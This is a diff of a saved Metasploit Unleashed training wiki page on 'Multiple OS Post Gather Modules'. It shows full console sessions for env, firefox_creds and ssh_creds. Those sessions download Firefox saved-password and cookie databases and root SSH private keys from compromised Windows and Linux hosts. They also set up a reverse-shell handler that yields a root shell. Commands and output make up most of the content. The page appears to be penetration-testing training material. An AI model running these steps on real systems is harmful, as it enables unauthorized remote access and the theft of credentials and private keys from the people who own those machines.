@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Multiple OS Post Gather Modules - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Multiple_OS_Post_Gather_Modules" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Multiple_OS_Post_Gather_Modules&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Multiple_OS_Post_Gather_Modules&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Multiple_OS_Post_Gather_Modules&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,263 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Multiple OS Post Gather Modules</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Multiple_OS_Post_Gather_Modules#column-one">navigation</a>, <a href="Multiple_OS_Post_Gather_Modules#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Multiple_OS_Post_Gather_Modules#env"><span class="tocnumber">1</span> <span class="toctext">env</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Multiple_OS_Post_Gather_Modules#firefox_creds"><span class="tocnumber">2</span> <span class="toctext">firefox_creds</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="Multiple_OS_Post_Gather_Modules#ssh_creds"><span class="tocnumber">3</span> <span class="toctext">ssh_creds</span></a></li>
+</ul>
+</td></tr></table>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="env"> env </span></h2>
+<p>The <b>"env"</b> module will collect and display the operating system environment variables on the compromised system.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run post/multi/gather/env</span>
+
+ComSpec=C:\WINDOWS\system32\cmd.exe
+FP_NO_HOST_CHECK=NO
+NUMBER_OF_PROCESSORS=1
+OS=Windows_NT
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
+PROCESSOR_ARCHITECTURE=x86
+PROCESSOR_IDENTIFIER=x86 Family 6 Model 37 Stepping 2, GenuineIntel
+PROCESSOR_LEVEL=6
+PROCESSOR_REVISION=2502
+Path=C:\Perl\site\bin;C:\Perl\bin;C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;c:\python25;c:\Program Files\Microsoft SQL Server\90\Tools\$
+TEMP=C:\WINDOWS\TEMP
+TMP=C:\WINDOWS\TEMP
+windir=C:\WINDOWS
+<u>meterpreter</u> ></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="firefox_creds"> firefox_creds </span></h2>
+<p>The <b>"firefox_creds"</b> post-exploitation module gathers saved credentials and cookies from an installed instance of Firefox on the compromised host. Third-party tools can then be used to extract the passwords if there is no master password set on the database.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run post/multi/gather/firefox_creds</span> 
+
+<span style='color:#0000FF;'>[*]</span> Checking for Firefox directory in: C:\Documents and Settings\Administrator\Application Data\Mozilla\
+<span style='color:#0000FF;'>[*]</span> Found Firefox installed
+<span style='color:#0000FF;'>[*]</span> Locating Firefox Profiles...
+
+<span style='color:#00ff00;'>[+]</span> Found Profile 8r4i3uac.default
+<span style='color:#00ff00;'>[+]</span> Downloading cookies.sqlite file from: C:\Documents and Settings\Administrator\Application Data\Mozilla\Firefox\Profiles\8r4i3uac.default
+<span style='color:#00ff00;'>[+]</span> Downloading cookies.sqlite-journal file from: C:\Documents and Settings\Administrator\Application Data\Mozilla\Firefox\Profiles\8r4i3uac.default
+<span style='color:#00ff00;'>[+]</span> Downloading key3.db file from: C:\Documents and Settings\Administrator\Application Data\Mozilla\Firefox\Profiles\8r4i3uac.default
+<span style='color:#00ff00;'>[+]</span> Downloading signons.sqlite file from: C:\Documents and Settings\Administrator\Application Data\Mozilla\Firefox\Profiles\8r4i3uac.default
+<u>meterpreter</u> ></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="ssh_creds"> ssh_creds </span></h2>
+<p>The <b>"ssh_creds"</b> module will collect the contents of user's .ssh directory on the targeted machine. Additionally, known_hosts and authorized_keys and any other files are also downloaded.
+<pre>msf > <span style='color:#13C16A;'>use exploit/multi/handler</span> 
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set PAYLOAD linux/x86/shell_reverse_tcp</span>
+payload => linux/x86/shell_reverse_tcp
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set LHOST 192.168.1.101</span>
+lhost => 192.168.1.101
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set LPORT 443</span>
+lport => 443
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>exploit</span>
+
+<span style='color:#0000FF;'>[*]</span> Started reverse handler on 192.168.1.101:443 
+<span style='color:#0000FF;'>[*]</span> Starting the payload handler...
+<span style='color:#0000FF;'>[*]</span> Command shell session 1 opened (192.168.1.101:443 -> 192.168.1.101:37059) at 2011-06-02 11:06:02 -0600
+
+<span style='color:#13C16A;'>id</span>
+uid=0(root) gid=0(root) groups=0(root)
+<span style='color:#13C16A;'>^Z</span>
+Background session 1? [y/N]  y
+
+msf exploit(<span style='color:#ff0000;'>handler</span>) ><span style='color:#13C16A;'> use post/multi/gather/ssh_creds</span> 
+msf post(<span style='color:#ff0000;'>ssh_creds</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (post/multi/gather/ssh_creds):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+msf post(<span style='color:#ff0000;'>ssh_creds</span>) > <span style='color:#13C16A;'>set SESSION 1</span>
+session => 1
+msf post(<span style='color:#ff0000;'>ssh_creds</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> Determining session platform and type...
+<span style='color:#0000FF;'>[*]</span> Checking for OpenSSH profile in: /bin/.ssh
+<span style='color:#0000FF;'>[-]</span> OpenSSH profile not found in /bin/.ssh
+<span style='color:#0000FF;'>[*]</span> Checking for OpenSSH profile in: /dev/.ssh
+<span style='color:#00ff00;'>…snip…</span>
+<span style='color:#0000FF;'>[-]</span> OpenSSH profile not found in /var/www/.ssh
+<span style='color:#00ff00;'>[+]</span> Downloading /root/.ssh/authorized_keys
+<span style='color:#00ff00;'>[+]</span> Downloading /root/.ssh/authorized_keys2
+<span style='color:#00ff00;'>[+]</span> Downloading /root/.ssh/id_rsa
+<span style='color:#00ff00;'>[+]</span> Downloading /root/.ssh/id_rsa.pub
+<span style='color:#00ff00;'>[+]</span> Downloading /root/.ssh/known_hosts
+<span style='color:#00ff00;'>[+]</span> Downloading /usr/NX/home/nx/.ssh/authorized_keys2
+<span style='color:#00ff00;'>[+]</span> Downloading /usr/NX/home/nx/.ssh/default.id_dsa.pub
+<span style='color:#00ff00;'>[+]</span> Downloading /usr/NX/home/nx/.ssh/known_hosts
+<span style='color:#00ff00;'>[+]</span> Downloading /usr/NX/home/nx/.ssh/restore.id_dsa.pub
+<span style='color:#0000FF;'>[*]</span> Post module execution completed
+msf post(<span style='color:#ff0000;'>ssh_creds</span>) ></pre>
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="http://www.offensive-security.com/w/index.php?title=Module_Reference&amp;action=edit&amp;redlink=1" class="new" title="Module Reference (page does not exist)">Module Reference</a> &gt; <a href="http://www.offensive-security.com/w/index.php?title=Post_Modules&amp;action=edit&amp;redlink=1" class="new" title="Post Modules (page does not exist)">Post Modules</a> &gt; <a href="http://www.offensive-security.com/w/index.php?title=Multiple_OS_Post_Modules&amp;action=edit&amp;redlink=1" class="new" title="Multiple OS Post Modules (page does not exist)">Multiple OS Post Modules</a> &gt; Multiple OS Post Gather Modules</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 524/1000000
+Preprocessor generated node count: 2653/1000000
+Post‐expand include size: 4954/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:258-0!*!0!!en!*!* and timestamp 20131124112740 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Multiple_OS_Post_Gather_Modules&amp;oldid=287">http://www.offensive-security.com/w/index.php?title=Multiple_OS_Post_Gather_Modules&amp;oldid=287</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Multiple_OS_Post_Modules&amp;action=edit&amp;redlink=1" class="new" title="Category:Multiple OS Post Modules (page does not exist)">Multiple OS Post Modules</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +748,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.153 secs. --></body></html>
